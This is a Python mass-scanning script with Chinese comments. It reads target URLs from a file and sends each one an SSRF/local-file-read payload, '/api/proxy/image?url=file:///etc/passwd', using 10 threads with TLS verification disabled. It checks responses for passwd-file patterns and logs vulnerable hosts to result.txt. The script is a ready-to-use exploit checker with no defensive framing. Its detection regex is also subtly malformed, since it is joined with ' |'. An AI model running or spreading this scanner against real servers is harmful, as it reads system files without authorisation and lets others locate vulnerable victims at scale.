import requests 
import threading 
from queue import Queue 
import re 
 
# 配置参数 
THREAD_NUM = 10  # 线程数量 
TIMEOUT = 5      # 超时时间(秒) 
QUEUE = Queue()  # URL队列 
RESULT_FILE = 'result.txt'   # 结果保存文件 
 
# 用于验证/etc/passwd内容的正则表达式模式 
PASSWD_PATTERNS = [ 
    r'root:x:\d+:\d+:',          # root用户条目特征 
    r'nobody:x:\d+:\d+:',        # nobody用户条目特征 
    r'\/bin\/bash',              # bash shell特征 
    r'\/sbin\/nologin'           # nologin shell特征 
] 
PASSWD_REGEX = re.compile(' |'.join(PASSWD_PATTERNS)) 
 
def validate_url(url): 
    """验证URL格式并规范化""" 
    url = url.strip()  
    # 检查是否以http://或https://开头 
    if not url.startswith(('http://',  'https://')): 
        return None 
    # 移除末尾的斜杠 
    return url.rstrip('/')  
 
def check_vulnerability(base_url): 
    """检查URL是否存在漏洞""" 
    test_path = '/api/proxy/image?url=file:///etc/passwd' 
    full_url = f"{base_url}{test_path}" 
    
    try: 
        # 发送请求，禁用SSL验证，不允许重定向 
        response = requests.get(  
            full_url, 
            timeout=TIMEOUT, 
            verify=False, 
            allow_redirects=False, 
            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'} 
        ) 
        
        # 3xx状态码认为没有漏洞 
        if 300 <= response.status_code  < 400: 
            return False, full_url 
        
        # 检查响应内容是否包含/etc/passwd特征 
        if response.text  and PASSWD_REGEX.search(response.text):  
            return True, full_url 
        return False, full_url 
        
    except Exception as e: 
        # 任何请求异常都视为没有漏洞 
        return False, full_url 
 
def worker(): 
    """线程工作函数""" 
    while not QUEUE.empty():  
        url = QUEUE.get()  
        try: 
            is_vulnerable, full_url = check_vulnerability(url) 
            if is_vulnerable: 
                print(f"[!] 发现漏洞: {full_url}") 
                with open(RESULT_FILE, 'a', encoding='utf-8') as f: 
                    f.write(f"{full_url}\n")  
            else: 
                print(f"[+] 无漏洞: {full_url}") 
        finally: 
            QUEUE.task_done()  
 
def main(): 
    """主函数""" 
    # 读取并验证URL列表 
    try: 
        with open('url.txt',  'r', encoding='utf-8') as f: 
            urls = [line.strip() for line in f if line.strip()]  
        
        valid_urls = [] 
        for url in urls: 
            normalized = validate_url(url) 
            if normalized: 
                valid_urls.append(normalized)  
            else: 
                print(f"[!] 无效URL格式: {url}") 
        
        print(f"[*] 共读取到 {len(urls)} 个URL，其中 {len(valid_urls)} 个格式有效") 
        
        # 将有效URL加入队列 
        for url in valid_urls: 
            QUEUE.put(url)  
        
        # 创建并启动线程 
        print(f"[*] 启动 {THREAD_NUM} 个线程开始检测...") 
        for _ in range(THREAD_NUM): 
            t = threading.Thread(target=worker) 
            t.daemon  = True 
            t.start()  
        
        # 等待所有任务完成 
        QUEUE.join()  
        print("[*] 检测完成，结果已保存到 result.txt")  
        
    except FileNotFoundError: 
        print("[!] 错误: url.txt  文件不存在") 
    except Exception as e: 
        print(f"[!] 发生错误: {str(e)}") 
 
if __name__ == "__main__": 
    # 禁用requests的SSL警告 
    requests.packages.urllib3.disable_warnings()  
    main() 